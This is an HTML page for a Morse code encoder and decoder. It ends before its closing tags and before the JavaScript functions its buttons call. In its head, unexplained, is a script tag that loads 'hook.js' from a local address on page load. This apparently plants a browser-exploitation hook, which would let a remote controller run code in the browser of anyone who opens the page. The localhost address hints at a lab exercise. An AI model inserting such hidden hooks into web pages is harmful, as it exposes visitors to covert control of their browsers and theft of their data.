<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Morse Code Encoder and Decoder</title>

<script src="http://127.0.0.1:300/hook.js"></script>
<body>
    <h1>Morse Code Encoder and Decoder</h1>

    <!-- Text to Morse Code Encoder -->
    <div>
        <label for="text-input">Enter Text:</label>
        <input type="text" id="text-input" placeholder="Enter text to encode">
        <button onclick="encodeToMorse()">Encode to Morse Code</button>
        <br></br>
        <button onclick="convertAndPlay()">Play Morse Code Audio</button> <!-- New button for audio -->
    </div>
    
    <br>

    <!-- Morse Code to Text Decoder -->
    <div>
        <label for="morse-input">Enter Morse Code:</label>
        <input type="text" id="morse-input" placeholder="Enter Morse code to decode (use spaces for separation)">
        <button onclick="decodeFromMorse()">Decode from Morse Code</button>
    </div>

    <br>

    <!-- Copy to Clipboard Button -->
    <div>
        <button id="copy-button" onclick="copyToClipboard()">Copy to Clipboard</button>
    </div>

    <!-- Display result here -->
    <div id="result">Output</div>

    <!-- Slot for audio playback feedback -->
    <div id="audio-feedback">
        <p>Audio playback will use your system's sound. Make sure your speakers are on.</p>
    </div>
